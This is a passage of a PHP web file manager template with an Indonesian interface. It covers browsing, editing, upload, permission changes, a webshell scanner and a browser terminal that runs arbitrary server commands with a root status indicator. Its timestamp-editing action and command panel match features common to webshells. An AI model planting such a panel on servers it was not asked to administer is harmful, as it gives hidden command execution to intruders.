.grid-name { padding:7px 8px; font-size:12px; color:var(--muted); white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }

/* ===================== CONTEXT MENU ===================== */
.ctx-menu {
  position:fixed; z-index:300; min-width:180px; background:var(--panel);
  border:1px solid var(--border); border-radius:10px; box-shadow:var(--shadow);
  padding:6px; animation:pop .12s ease;
}
.ctx-menu a, .ctx-menu .ctx-item {
  display:flex; align-items:center; gap:10px; padding:8px 12px; border-radius:7px;
  color:var(--text); font-size:13px; text-decoration:none; cursor:pointer; transition:background var(--t);
}
.ctx-menu a:hover, .ctx-menu .ctx-item:hover { background:var(--panel-2); text-decoration:none; }
.ctx-menu .ctx-item.danger { color:var(--red); }
.ctx-menu .ctx-sep { height:1px; background:var(--border-soft); margin:4px 0; }

/* ===================== PROPS TABLE ===================== */
.props-table { width:100%; border-collapse:collapse; }
.props-table td { padding:7px 8px; border-bottom:1px solid var(--border-soft); font-size:13px; vertical-align:top; }
.props-table td:first-child { color:var(--muted); width:100px; font-weight:500; }
.props-table td.mono { font-family:var(--mono); font-size:12px; word-break:break-all; }

/* ===================== TOOLBAR ===================== */
.toolbar { display:flex; gap:8px; flex-wrap:wrap; margin:14px 0; align-items:center; }
.toolbar button, .toolbar .btn, .btn {
  background:var(--panel); color:var(--text); border:1px solid var(--border);
  padding:8px 14px; border-radius:var(--radius-sm); cursor:pointer; font-size:13px; font-weight:500;
  font-family:var(--font); transition:all var(--t); display:inline-flex; align-items:center; gap:6px;
}
.toolbar button:hover, .toolbar .btn:hover, .btn:hover { background:var(--panel-2); border-color:#314161; transform:translateY(-1px); }
.toolbar button:active, .btn:active { transform:translateY(0); }
.toolbar button.danger { color:var(--red); border-color:rgba(239,68,68,.35); background:var(--red-soft); }
.toolbar button.danger:hover { background:rgba(239,68,68,.22); }
.toolbar button.primary { background:linear-gradient(180deg,var(--accent),var(--accent-strong)); color:#fff; border:none; }
.toolbar input[type=text] {
  background:var(--panel); border:1px solid var(--border); color:var(--text);
  padding:8px 12px; border-radius:var(--radius-sm); font-family:var(--mono); font-size:13px;
  transition:border-color var(--t), box-shadow var(--t);
}
.toolbar input[type=text]:focus { border-color:var(--accent); outline:none; box-shadow:0 0 0 3px var(--accent-soft); }
.toolbar .count { color:var(--muted); font-size:12px; }

/* ===================== TABLE ===================== */
.table-wrap { background:var(--panel); border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; box-shadow:var(--shadow-sm); }
table { width:100%; border-collapse:collapse; }
thead th {
  position:sticky; top:0;
  color:var(--muted); font-weight:600; font-size:11px; text-transform:uppercase; letter-spacing:.5px;
  background:var(--panel-2); padding:11px 14px; text-align:left; border-bottom:1px solid var(--border);
}
th.sortable { cursor:pointer; user-select:none; }
th.sortable:hover { color:var(--text); }

/* Webshell flag */
.ws-hit { background:rgba(239,68,68,.12) !important; }
.ws-hit td { border-color:rgba(239,68,68,.25); }
.ws-flag {
  color:#ef4444; margin-left:7px; font-size:13px; cursor:help;
  animation:wsPulse 1.2s ease-in-out infinite;
  text-shadow:0 0 6px rgba(239,68,68,.6);
}
@keyframes wsPulse { 0%,100% { opacity:1; } 50% { opacity:.4; } }
.grid-card.ws-hit { border:1px solid #ef4444; background:rgba(239,68,68,.12); }
tbody td { padding:10px 14px; border-bottom:1px solid var(--border-soft); }
tbody tr { transition:background var(--t); }
tbody tr:nth-child(even) { background:rgba(255,255,255,.015); }
tbody tr:hover { background:var(--accent-soft); }
tbody tr:last-child td { border-bottom:none; }
td.name { font-weight:500; }
td.name a { font-weight:500; display:inline-flex; align-items:center; gap:6px; }
td.name .ico { font-size:14px; width:18px; text-align:center; }
td.mono { font-family:var(--mono); font-size:12px; color:var(--muted); }
td.perm { letter-spacing:.5px; }
.actions { white-space:nowrap; }
.actions a {
  margin-right:10px; font-size:12px; color:var(--muted); padding:3px 6px; border-radius:5px;
  transition:all var(--t);
}
.actions a:hover { color:var(--text); background:var(--panel-2); text-decoration:none; }
.actions a.danger { color:var(--red); }
.actions a.danger:hover { background:var(--red-soft); }
.empty-row td { text-align:center; padding:40px; color:var(--muted-2); }

/* ===================== PANEL / EDITOR / VIEW ===================== */
.panel { background:var(--panel); border:1px solid var(--border); border-radius:var(--radius); padding:18px; margin-top:16px; box-shadow:var(--shadow-sm); }
.panel h2 { margin:0 0 14px; font-size:15px; font-weight:600; display:flex; align-items:center; gap:8px; }
.editor textarea {
  width:100%; height:55vh; background:#070c16; color:var(--text);
  border:1px solid var(--border); border-radius:var(--radius-sm); padding:14px;
  font-family:var(--mono); font-size:13px; line-height:1.55;
  resize:vertical; transition:border-color var(--t);
}
.editor textarea:focus { border-color:var(--accent); outline:none; }
.CodeMirror {
  height:55vh;
  border:1px solid var(--border);
  border-radius:var(--radius-sm);
  font-size:13px;
  line-height:1.55;
  font-family:var(--mono);
}
.CodeMirror-focused { border-color:var(--accent) !important; }
.CodeMirror-gutters { border-right:1px solid var(--border); }
.CodeMirror-linenumber { color:var(--muted-2); }
pre.view {
  background:#070c16; padding:16px; border-radius:var(--radius-sm); overflow:auto; max-height:60vh;
  font-size:13px; line-height:1.55; border:1px solid var(--border);
}
label.file-label { cursor:pointer; }

/* ===================== CHECKBOX ===================== */
input[type=checkbox] { accent-color:var(--accent); width:15px; height:15px; cursor:pointer; }

/* ===================== SECTION HEADING ===================== */
h2.sec { font-size:15px; margin:26px 0 10px; font-weight:600; display:flex; align-items:center; gap:8px; }
h2.sec .hint { color:var(--muted-2); font-weight:400; font-size:12px; }

/* ===================== TERMINAL (CMD STYLE) ===================== */
.terminal {
  background:#0c0c0c; border:1px solid #333; border-radius:6px;
  margin-top:12px; overflow:hidden; box-shadow:var(--shadow);
  font-family:Consolas,'Courier New',Courier,monospace;
}
.terminal .t-head {
  padding:7px 12px; background:#f0f0f0; border-bottom:1px solid #ccc;
  font-size:12px; color:#333; display:flex; justify-content:space-between; align-items:center; gap:10px;
  font-family:var(--font);
}
.terminal .t-head b { font-weight:700; }
.terminal .t-out {
  padding:12px 14px; min-height:140px; max-height:420px; overflow:auto;
  white-space:pre-wrap; word-break:break-all; font-size:14px; line-height:1.45;
  color:#cccccc; background:#0c0c0c;
}
.terminal form { display:flex; align-items:center; border-top:1px solid #333; background:#0c0c0c; }
.terminal .prompt { padding:12px 6px 12px 14px; color:#ffffff; font-weight:400; white-space:nowrap; font-size:14px; }
.terminal input {
  flex:1; background:transparent; border:none; color:#cccccc; font-family:inherit; font-size:14px;
  padding:12px 10px; outline:none; caret-color:#ffffff;
}
.terminal .t-quick { display:flex; flex-wrap:wrap; gap:4px; padding:8px 12px; border-top:1px solid #222; background:#0c0c0c; }
.terminal .t-quick a {
  color:#999; font-size:11.5px; padding:3px 9px; border-radius:4px;
  border:1px solid #333; transition:all var(--t); font-family:inherit;
}
.terminal .t-quick a:hover { color:#fff; border-color:#666; background:#1a1a1a; text-decoration:none; }

/* ===================== RESPONSIVE ===================== */
@media (max-width:760px) {
  .wrap, .pathbar { padding-left:12px; padding-right:12px; }
  td.mono.perm, th:nth-child(3), td:nth-child(3) { display:none; }
  .actions a { margin-right:6px; }
  .topbar { gap:8px; }
}

/* ===================== LIGHT THEME ===================== */
body.light {
  --bg:#eef2f7;
  --panel:#ffffff;
  --panel-2:#f4f7fb;
  --border:#d8e0ec;
  --border-soft:#e6ecf4;
  --text:#0f172a;
  --muted:#5b6b82;
  --muted-2:#94a3b8;
  --accent:#16a34a;
  --accent-strong:#1d4ed8;
  --accent-soft:rgba(37,99,235,.10);
  --green:#059669;
  --green-soft:rgba(5,150,105,.12);
  --red:#dc2626;
  --red-soft:rgba(220,38,38,.10);
  --amber:#d97706;
  --amber-soft:rgba(217,119,6,.12);
  --shadow:0 10px 28px -14px rgba(15,23,42,.18);
  --shadow-sm:0 1px 6px rgba(15,23,42,.08);
}
body.light { background:#eef2f7 radial-gradient(1100px 500px at 50% -8%, #dbeafe 0%, rgba(219,234,254,0) 60%); }
 body.light .topbar { background:rgba(255,255,255,.82); }
body.light .editor textarea, body.light pre.view, body.light .CodeMirror { color:#0f172a; }
</style>
</head>
<body>
<div class="topbar">
  <h1><i class="fa-solid fa-folder-tree" style="color:var(--accent);"></i> File Manager <span style="background:linear-gradient(180deg,#dc2626,#991b1b);color:#fff;padding:2px 9px;border-radius:6px;font-size:10.5px;font-weight:800;letter-spacing:.5px;">ADMIN</span></h1>
  <span style="color:var(--muted-2);font-size:12px;font-family:var(--mono);"><?= h($root) ?></span>
  <div class="spacer"></div>
  <span class="status-pill <?= $sudo_ok ? 'ok' : 'warn' ?>"><?= $sudo_ok ? '<i class="fa-solid fa-circle-check"></i> root' : '<i class="fa-solid fa-circle-exclamation"></i> user mode' ?></span>
  <button type="button" class="pathbtn" onclick="toggleSidebar()" title="Folder tree"><i class="fa-solid fa-bars"></i></button>
  <button type="button" class="pathbtn" id="autoBtn" onclick="toggleAutoRefresh()" title="Auto-refresh folder"><i class="fa-solid fa-arrows-rotate"></i></button>
  <button type="button" class="pathbtn" onclick="toggleTheme()" title="Ganti tema"><i class="fa-solid fa-circle-half-stroke"></i></button>
  <a class="navlink" href="?p=<?= urlencode($cwd) ?>"><i class="fa-solid fa-rotate-right"></i> Refresh</a>
  <a class="logout navlink" href="?logout=1" onclick="doLogout(); return false;"><i class="fa-solid fa-power-off"></i> Logout</a>
</div>

<div class="wrap" id="filesView">
  <div class="layout">
    <aside class="sidebar" id="sidebar">
      <div class="sidebar-head">
        <span><i class="fa-solid fa-folder-tree" style="color:var(--accent);"></i> Folder</span>
        <button type="button" class="pathbtn" onclick="toggleSidebar()" title="Tutup"><i class="fa-solid fa-xmark"></i></button>
      </div>
      <div class="sidebar-body">
        <a class="tree-root" href="?p=<?= urlencode($root) ?>"><i class="fa-solid fa-house"></i> <?= h($root) ?></a>
        <?= $tree_html ?>
      </div>
    </aside>
    <div class="main-content">
  <?php if ($flash_msg): ?>
    <div class="flash <?= h($flash_msg['type']) ?>"><?= h($flash_msg['msg']) ?></div>
  <?php endif; ?>

  <!-- Server dashboard -->
  <div class="panel dash">
    <div class="dash-grid">
      <div class="dash-item">
        <div class="dash-label"><i class="fa-solid fa-server"></i> Server</div>
        <div class="dash-val"><?= h($sinfo['host']) ?></div>
        <div class="dash-sub"><?= h($sinfo['os']) ?> · <?= h($sinfo['kernel']) ?></div>
      </div>
      <div class="dash-item">
        <div class="dash-label"><i class="fa-solid fa-clock"></i> Uptime</div>
        <div class="dash-val"><?= h(preg_replace('/^.*?up\s+/', '', $sinfo['uptime'])) ?></div>
        <div class="dash-sub">load: <?= h($sinfo['load']) ?></div>
      </div>
      <div class="dash-item">
        <div class="dash-label"><i class="fa-solid fa-microchip"></i> CPU</div>
        <div class="dash-val"><?= h($sinfo['cores']) ?> cores</div>
        <div class="dash-sub">load average</div>
      </div>
      <div class="dash-item">
        <div class="dash-label"><i class="fa-solid fa-memory"></i> RAM</div>
        <div class="dash-val"><?= h($sinfo['ram_used']) ?> / <?= h($sinfo['ram_total']) ?> MB</div>
        <div class="bar"><div class="bar-fill <?= $sinfo['ram_pct'] > 80 ? 'warn' : '' ?>" style="width:<?= (int)$sinfo['ram_pct'] ?>%"></div></div>
        <div class="dash-sub"><?= (int)$sinfo['ram_pct'] ?>%</div>
      </div>
      <div class="dash-item">
        <div class="dash-label"><i class="fa-solid fa-hard-drive"></i> Disk /</div>
        <div class="dash-val"><?= h($sinfo['disk_used']) ?> / <?= h($sinfo['disk_size']) ?></div>
        <div class="bar"><div class="bar-fill <?= $sinfo['disk_pct'] > 80 ? 'warn' : '' ?>" style="width:<?= (int)$sinfo['disk_pct'] ?>%"></div></div>
        <div class="dash-sub"><?= (int)$sinfo['disk_pct'] ?>%</div>
      </div>
    </div>
  </div>

  <!-- Bookmarks -->
  <?php if (!empty($bookmarks)): ?>
  <div class="toolbar" style="margin:0 0 4px;">
    <span class="count"><i class="fa-regular fa-bookmark"></i> Bookmark:</span>
    <?php foreach ($bookmarks as $bm): ?>
      <a class="btn" href="?p=<?= urlencode($bm) ?>" style="font-family:var(--mono);font-size:12px;"><?= h($bm) ?></a>
    <?php endforeach; ?>
  </div>
  <?php endif; ?>

  <!-- Search (terpisah dari bulk form, valid HTML) -->
  <form method="post" onsubmit="return doSearch(this)">
    <input type="hidden" name="csrf" value="<?= h(csrf_token()) ?>">
    <input type="hidden" name="cwd" value="<?= h($cwd) ?>">
    <input type="hidden" name="action" id="searchAction" value="search">
    <div class="toolbar">
      <input type="text" name="q" placeholder="Cari nama file / isi file..." style="flex:1;">
      <button type="submit" onclick="setSearch('search')"><i class="fa-solid fa-magnifying-glass"></i> Nama</button>
      <button type="submit" onclick="setSearch('grep')"><i class="fa-solid fa-file-magnifying-glass"></i> Isi file</button>
    </div>
  </form>

  <!-- Webshell scanner -->
  <form method="post" style="margin:0 0 12px;">
    <input type="hidden" name="csrf" value="<?= h(csrf_token()) ?>">
    <input type="hidden" name="cwd" value="<?= h($cwd) ?>">
    <input type="hidden" name="action" value="scan_webshell">
    <button type="submit" class="btn" style="color:var(--amber);border-color:rgba(245,158,11,.4);background:var(--amber-soft);"><i class="fa-solid fa-shield-halved"></i> Scan Webshell (folder ini)</button>
  </form>

  <!-- Create + upload (dipindah ke atas) -->
  <div class="toolbar" style="padding-bottom:14px;border-bottom:1px solid var(--border-soft);margin-bottom:14px;">
    <form method="post" style="display:flex;gap:8px;align-items:center;">
      <input type="hidden" name="csrf" value="<?= h(csrf_token()) ?>">
      <input type="hidden" name="cwd" value="<?= h($cwd) ?>">
      <input type="hidden" name="action" value="create_file">
      <input type="text" name="name" placeholder="Nama file baru">
      <button type="submit"><i class="fa-solid fa-file-circle-plus"></i> File</button>
    </form>
    <form method="post" style="display:flex;gap:8px;align-items:center;">
      <input type="hidden" name="csrf" value="<?= h(csrf_token()) ?>">
      <input type="hidden" name="cwd" value="<?= h($cwd) ?>">
      <input type="hidden" name="action" value="create_dir">
      <input type="text" name="name" placeholder="Nama folder baru">
      <button type="submit"><i class="fa-solid fa-folder-plus"></i> Folder</button>
    </form>
    <form method="post" enctype="multipart/form-data" style="display:flex;gap:8px;align-items:center;">
      <input type="hidden" name="csrf" value="<?= h(csrf_token()) ?>">
      <input type="hidden" name="cwd" value="<?= h($cwd) ?>">
      <input type="hidden" name="action" value="upload">
      <label class="file-label btn primary" id="uploadLabel">
        <i class="fa-solid fa-cloud-arrow-up"></i> Upload file
        <input type="file" name="files[]" multiple style="display:none;" onchange="uploadFiles(this)">
      </label>
    </form>
    <!-- Progress bar upload -->
    <div class="upload-progress" id="uploadProgress" style="display:none;">
      <div class="upload-progress-info"><span id="uploadPct">0%</span> · <span id="uploadCount">0</span> file</div>
      <div class="bar"><div class="bar-fill" id="uploadBar" style="width:0%;"></div></div>
    </div>
  </div>

  <!-- Tombol TERMINAL (menonjol, di atas path) -->
  <button type="button" class="term-big-btn" onclick="showView('terminal')">
    <i class="fa-solid fa-terminal"></i> TERMINAL
  </button>

  <!-- Path bar (di atas tabel, di bawah create/upload) -->
  <div class="pathbar" id="pathbar" style="padding:0 0 16px;max-width:none;margin:0;">
    <div class="pathbar-row">
      <a class="pathbtn" href="?p=<?= urlencode($root) ?>" title="Ke root"><i class="fa-solid fa-house"></i></a>
      <a class="pathbtn" href="?p=<?= urlencode(dirname($cwd)) ?>" title="Naik satu level"><i class="fa-solid fa-arrow-up"></i></a>
      <div class="crumbs">
        <?php foreach ($crumbs as $i => $c): ?>
          <?php if ($i > 0): ?><span class="sep"><i class="fa-solid fa-angle-right"></i></span><?php endif; ?>
          <a href="?p=<?= urlencode($c['path']) ?>"><?= h($c['label']) ?></a>
        <?php endforeach; ?>
      </div>
      <button type="button" class="pathbtn" onclick="togglePathEdit()" title="Ketik path langsung"><i class="fa-solid fa-pen"></i></button>
      <a class="pathbtn" href="?p=<?= urlencode($cwd) ?>" title="Refresh"><i class="fa-solid fa-rotate-right"></i></a>
    </div>
    <form class="pathform" id="pathEdit" onsubmit="gotoPath();return false;" style="display:none;">
      <span class="pathlabel"><i class="fa-solid fa-folder-open"></i></span>
      <input type="text" id="pathInput" value="<?= h($cwd) ?>" placeholder="ketik path, mis. /var/www" autocomplete="off" spellcheck="false">
      <button type="submit"><i class="fa-solid fa-arrow-right"></i> Go</button>
    </form>
  </div>

  <!-- Bulk action form -->
  <form method="post" id="bulkForm">
    <input type="hidden" name="csrf" value="<?= h(csrf_token()) ?>">
    <input type="hidden" name="cwd" value="<?= h($cwd) ?>">
    <input type="hidden" name="action" id="bulkAction" value="delete">
    <input type="hidden" name="zipname" id="zipname" value="">

    <div class="toolbar">
      <button type="button" class="danger" onclick="bulkDelete()"><i class="fa-solid fa-trash-can"></i> Delete</button>
      <button type="button" onclick="bulkAction('copy_selected')"><i class="fa-solid fa-copy"></i> Copy</button>
      <button type="button" onclick="bulkAction('move_selected')"><i class="fa-solid fa-scissors"></i> Move</button>
      <button type="button" onclick="bulkZip()"><i class="fa-solid fa-file-zipper"></i> Zip</button>
      <button type="button" onclick="selectAll()"><i class="fa-solid fa-square-check"></i> Select semua</button>
      <span class="count" id="selCount">0 dipilih</span>
      <a class="btn" href="#" onclick="bookmarkAdd();return false;"><i class="fa-regular fa-bookmark"></i> Bookmark</a>
      <button type="button" class="btn" onclick="toggleGrid()" id="gridBtn" title="Ganti tampilan"><i class="fa-solid fa-grip"></i> Grid</button>
      <span style="flex:1;"></span>
      <?php if ($clipboard): ?>
      <span class="status-pill ok"><i class="fa-solid fa-clipboard"></i> <?= count($clipboard['items']) ?> item (<?= $clipboard['mode'] === 'move' ? 'Move' : 'Copy' ?>)</span>
      <button type="button" class="primary" onclick="doPaste()"><i class="fa-solid fa-paste"></i> Paste</button>
      <button type="button" onclick="clearClip()"><i class="fa-solid fa-xmark"></i></button>
      <?php endif; ?>
    </div>

    <div class="table-wrap" id="tableView">
    <table>
      <thead>
        <tr>
          <th style="width:34px;"><input type="checkbox" id="chkAll" onclick="toggleAll()"></th>
          <th class="sortable" data-col="1" onclick="sortTable(1, this)">Nama <i class="fa-solid fa-sort"></i></th>
          <th class="sortable" data-col="2" onclick="sortTable(2, this)">Size <i class="fa-solid fa-sort"></i></th>
          <th>Perms</th>
          <th class="sortable" data-col="4" onclick="sortTable(4, this)">Modified <i class="fa-solid fa-sort"></i></th>
          <th>Aksi</th>
        </tr>
      </thead>
      <tbody id="fileRows">
        <?php if ($cwd !== $root): $parent = dirname($cwd); ?>
        <tr>
          <td></td>
          <td class="name"><a href="?p=<?= urlencode($parent) ?>"><span class="ico"><i class="fa-solid fa-arrow-up"></i></span> ..</a></td>
          <td></td><td></td><td></td><td></td>
        </tr>
        <?php endif; ?>
        <?php if (empty($items)): ?>
        <tr class="empty-row"><td colspan="6">Direktori kosong.</td></tr>
        <?php endif; ?>
        <?php foreach ($items as $it): $is_hit = isset($webshell_hits[$it['path']]); ?>
        <tr data-path="<?= h($it['path']) ?>" data-isdir="<?= $it['is_dir'] ? '1' : '0' ?>" data-name="<?= h($it['name']) ?>" data-size="<?= $it['is_dir'] ? '' : human_size($it['size']) ?>" data-perms="<?= h($it['perms']) ?>" data-mtime="<?= h(date('Y-m-d H:i', $it['mtime'])) ?>" class="<?= $is_hit ? 'ws-hit' : '' ?>">
          <td><input type="checkbox" class="chk" name="targets[]" value="<?= h($it['path']) ?>"></td>
          <td class="name">
            <?php if ($it['is_dir']): ?>
              <a href="?p=<?= urlencode($it['path']) ?>"><span class="ico" style="color:var(--amber);"><i class="fa-solid fa-folder"></i></span> <?= h($it['name']) ?></a>
            <?php else: $fi = file_icon($it['name']); ?>
              <span class="ico" style="color:<?= h($fi[1]) ?>;"><i class="<?= h($fi[0]) ?>"></i></span> <?= h($it['name']) ?>
            <?php endif; ?>
            <?php if ($is_hit): ?><span class="ws-flag" title="Webshell mencurigakan!"><i class="fa-solid fa-triangle-exclamation"></i></span><?php endif; ?>
          </td>
          <td class="mono"><?= $it['is_dir'] ? '—' : human_size($it['size']) ?></td>
          <td class="mono perm"><?= h($it['perms']) ?></td>
          <td class="mono"><?= h(date('Y-m-d H:i', $it['mtime'])) ?></td>
          <td class="actions">
            <a href="?view=<?= urlencode($it['path']) ?>&p=<?= urlencode($cwd) ?>" title="Lihat"><i class="fa-solid fa-eye"></i></a>
            <?php if (!$it['is_dir']): ?>
              <a href="?edit=<?= urlencode($it['path']) ?>&p=<?= urlencode($cwd) ?>" title="Edit"><i class="fa-solid fa-pen-to-square"></i></a>
              <a href="?download=<?= urlencode($it['path']) ?>" title="Download"><i class="fa-solid fa-download"></i></a>
            <?php endif; ?>
            <?php if (!$it['is_dir'] && preg_match('/\.zip$/i', $it['name'])): ?>
              <a href="#" onclick="unzipItem('<?= h($it['path']) ?>');return false;" title="Unzip"><i class="fa-solid fa-box-open"></i></a>
            <?php endif; ?>
            <a href="#" onclick="showProps(this.closest('tr'));return false;" title="Properties"><i class="fa-solid fa-circle-info"></i></a>
            <a href="#" onclick="renameItem('<?= h($it['path']) ?>','<?= h($it['name']) ?>');return false;" title="Rename"><i class="fa-solid fa-i-cursor"></i></a>
            <a href="#" onclick="chmodItem('<?= h($it['path']) ?>','<?= h($it['perms']) ?>');return false;" title="Chmod"><i class="fa-solid fa-lock"></i></a>
            <a href="#" onclick="chownItem('<?= h($it['path']) ?>');return false;" title="Chown"><i class="fa-solid fa-user-gear"></i></a>
            <a href="#" onclick="touchItem('<?= h($it['path']) ?>','<?= h(date('Y-m-d H:i:s', $it['mtime'])) ?>');return false;" title="Ganti waktu"><i class="fa-solid fa-clock"></i></a>
            <a class="danger" href="#" onclick="delOne('<?= h($it['path']) ?>', <?= $it['is_dir'] ? 'true' : 'false' ?>);return false;" title="Delete"><i class="fa-solid fa-trash-can"></i></a>
          </td>
        </tr>
        <?php endforeach; ?>
      </tbody>
    </table>
    </div>
  </form>

  <!-- Grid view (image thumbnail) -->
  <div id="gridView" class="grid-view" style="display:none;">
    <?php if (empty($items)): ?>
      <div class="empty-row" style="text-align:center;padding:40px;color:var(--muted-2);">Direktori kosong.</div>
    <?php endif; ?>
    <?php foreach ($items as $it): $is_hit = isset($webshell_hits[$it['path']]); ?>
      <div class="grid-card<?= $is_hit ? ' ws-hit' : '' ?>" data-path="<?= h($it['path']) ?>" data-isdir="<?= $it['is_dir'] ? '1' : '0' ?>" data-name="<?= h($it['name']) ?>" data-size="<?= $it['is_dir'] ? '' : human_size($it['size']) ?>" data-perms="<?= h($it['perms']) ?>" data-mtime="<?= h(date('Y-m-d H:i', $it['mtime'])) ?>" <?php if ($it['is_dir']): ?>onclick="navigate('<?= h($it['path']) ?>')"<?php elseif (preg_match('/\.(png|jpe?g|gif|webp|svg)$/i', $it['name'])): ?>onclick="location='?view=<?= urlencode($it['path']) ?>&p=<?= urlencode($cwd) ?>'"<?php else: ?>onclick="location='?edit=<?= urlencode($it['path']) ?>&p=<?= urlencode($cwd) ?>'"<?php endif; ?>>
        <?php if ($it['is_dir']): ?>
          <div class="grid-thumb" style="background:var(--amber-soft);color:var(--amber);"><i class="fa-solid fa-folder"></i></div>
        <?php elseif (preg_match('/\.(png|jpe?g|gif|webp|svg)$/i', $it['name'])): ?>
          <div class="grid-thumb"><img src="?preview=<?= urlencode($it['path']) ?>" loading="lazy" alt="<?= h($it['name']) ?>"></div>
        <?php else: $fi = file_icon($it['name']); ?>
          <div class="grid-thumb" style="color:<?= h($fi[1]) ?>;"><i class="<?= h($fi[0]) ?>"></i></div>
        <?php endif; ?>
        <div class="grid-name" title="<?= h($it['name']) ?>"><?= h($it['name']) ?><?php if ($is_hit): ?> <span class="ws-flag" title="Webshell mencurigakan!"><i class="fa-solid fa-triangle-exclamation"></i></span><?php endif; ?></div>
      </div>
    <?php endforeach; ?>
  </div>

  <!-- Search results -->
  <?php if ($search_q !== ''): ?>
  <div class="panel" style="margin-top:16px;">
    <?php if ($search_mode === 'webshell'): ?>
      <h2><i class="fa-solid fa-shield-halved" style="color:var(--amber);"></i> Hasil Scan Webshell <span class="hint">di <?= h($search_cwd) ?></span></h2>
      <?php if (trim($search_results) === ''): ?>
        <p style="color:var(--green);"><i class="fa-solid fa-circle-check"></i> Tidak ada file mencurigakan ditemukan.</p>
      <?php else: ?>
        <p style="color:var(--amber);"><i class="fa-solid fa-triangle-exclamation"></i> File mencurigakan (potensi webshell/backdoor):</p>
        <pre class="view" style="max-height:320px;"><?php
          $lines = explode("\n", trim($search_results));
          foreach ($lines as $ln) {
              echo h('./' . ltrim($ln, './')) . "\n";
          }
        ?></pre>
      <?php endif; ?>
    <?php else: ?>
      <h2><i class="fa-solid <?= $search_mode === 'content' ? 'fa-file-magnifying-glass' : 'fa-magnifying-glass' ?>" style="color:var(--accent);"></i> Hasil <?= $search_mode === 'content' ? 'grep isi file' : 'pencarian' ?>: "<?= h($search_q) ?>" <span class="hint">di <?= h($search_cwd) ?></span></h2>
      <?php if (trim($search_results) === ''): ?>
        <p style="color:var(--muted);">Tidak ada hasil.</p>
      <?php else: ?>
        <pre class="view" style="max-height:320px;"><?php
          $lines = explode("\n", trim($search_results));
          foreach ($lines as $ln) {
              $full = rtrim($search_cwd, '/') . '/' . ltrim($ln, './');
              echo h($ln) . "\n";
          }
        ?></pre>
      <?php endif; ?>
    <?php endif; ?>
    <a class="btn" href="?p=<?= urlencode($cwd) ?>" style="margin-top:10px;">Tutup hasil</a>
  </div>
  <?php endif; ?>

  <!-- Editor (popup modal) -->
  <?php if ($editing): ?>
  <div class="modal-overlay editor-overlay" style="display:flex;">
    <div class="modal editor-modal">
      <h3><i class="fa-solid fa-pen-to-square" style="color:var(--accent);"></i> Edit File <a class="btn" href="?p=<?= urlencode($cwd) ?>" style="margin-left:auto;"><i class="fa-solid fa-xmark"></i></a></h3>
      <div class="modal-path"><?= h($editing) ?></div>
      <div class="toolbar" style="margin:0 0 10px;">
        <button type="button" onclick="cmFind()"><i class="fa-solid fa-magnifying-glass"></i> Find</button>
        <button type="button" onclick="cmReplace()"><i class="fa-solid fa-right-left"></i> Replace</button>
        <button type="button" onclick="cmReplaceAll()"><i class="fa-solid fa-arrows-rotate"></i> Replace All</button>
        <button type="button" onclick="cmWrap()"><i class="fa-solid fa-align-left"></i> Wrap</button>
        <button type="button" onclick="cmGoLine()"><i class="fa-solid fa-arrow-down"></i> Go line</button>
      </div>
      <form method="post" id="editForm" onsubmit="saveFile(event); return false;">
        <input type="hidden" name="csrf" value="<?= h(csrf_token()) ?>">
        <input type="hidden" name="cwd" value="<?= h($cwd) ?>">
        <input type="hidden" name="action" value="save_file">
        <input type="hidden" name="target" value="<?= h($editing) ?>">
        <textarea name="content" id="editor" spellcheck="false"><?= h($edit_content) ?></textarea>
        <div class="toolbar" style="margin-top:12px;">
          <button type="submit" class="primary"><i class="fa-solid fa-floppy-disk"></i> Simpan</button>
          <a class="btn" href="?p=<?= urlencode($cwd) ?>">Batal</a>
          <span class="count" id="editorInfo">0 baris · 0 karakter</span>
        </div>
      </form>
    </div>
  </div>
  <?php endif; ?>

  <!-- Viewer -->
  <?php if ($viewing): ?>
  <div class="panel">
    <h2><i class="fa-solid fa-eye" style="color:var(--accent);"></i> View: <span style="color:var(--muted);font-family:var(--mono);font-size:12px;"><?= h($viewing) ?></span></h2>
    <?php if ($view_is_image): ?>
      <div style="text-align:center;background:#070c16;border:1px solid var(--border);border-radius:8px;padding:20px;">
        <img src="?preview=<?= urlencode($viewing) ?>" alt="<?= h(basename($viewing)) ?>" style="max-width:100%;max-height:70vh;border-radius:6px;">
      </div>
      <div class="toolbar" style="margin-top:10px;">
        <a class="btn" href="?download=<?= urlencode($viewing) ?>"><i class="fa-solid fa-download"></i> Download</a>
      </div>
    <?php elseif ($view_is_video): ?>
      <div style="text-align:center;background:#070c16;border:1px solid var(--border);border-radius:8px;padding:20px;">
        <video controls autoplay style="max-width:100%;max-height:70vh;border-radius:6px;" src="?preview=<?= urlencode($viewing) ?>"></video>
      </div>
    <?php elseif ($view_is_audio): ?>
      <div style="background:#070c16;border:1px solid var(--border);border-radius:8px;padding:24px;">
        <audio controls autoplay style="width:100%;" src="?preview=<?= urlencode($viewing) ?>"></audio>
      </div>
    <?php else: ?>
      <textarea id="viewer" readonly><?= h($view_content) ?></textarea>
    <?php endif; ?>
    <a class="btn" href="?p=<?= urlencode($cwd) ?>" style="display:inline-flex;margin-top:12px;">Tutup</a>
  </div>
  <?php endif; ?>

    </div>
  </div>
</div>

<!-- Terminal view (terpisah dari file manager) -->
<div class="wrap" id="terminalView" style="display:none;">
  <h2 class="sec"><i class="fa-solid fa-terminal" style="color:var(--green);"></i> Terminal <span class="hint">— cwd: <?= h($term_cwd) ?></span> <button type="button" class="btn" style="margin-left:auto;" onclick="showView('files')"><i class="fa-solid fa-arrow-left"></i> Kembali ke File Manager</button></h2>
  <div class="terminal" style="min-height:70vh;">
    <div class="t-head">
      <span>Command Prompt — <?= h($whoami ?: '?') ?>@<?= h(php_uname('n')) ?></span>
      <span><?= $sudo_ok ? 'Administrator' : 'User' ?></span>
    </div>
    <div class="t-out" id="tOut" style="min-height:58vh;"><?= h((isset($terminal_out) ? $terminal_out : '')) ?><?= isset($terminal_out) ? '' : "Ketik perintah lalu tekan Enter.\n" ?></div>
    <form method="post" id="termForm">
      <input type="hidden" name="csrf" value="<?= h(csrf_token()) ?>">
      <input type="hidden" name="cwd" value="<?= h($cwd) ?>">
      <input type="hidden" name="action" value="run_cmd">
      <span class="prompt"><?= h($term_cwd) ?>&gt;</span>
      <input type="text" name="cmd" id="termCmd" autocomplete="off" placeholder="ls -la /  ·  cd /etc  ·  chmod 755 file  ·  df -h">
    </form>
    <div class="t-quick">
      <a href="#" onclick="quick('df -h');return false;">df -h</a>
      <a href="#" onclick="quick('free -m');return false;">free -m</a>
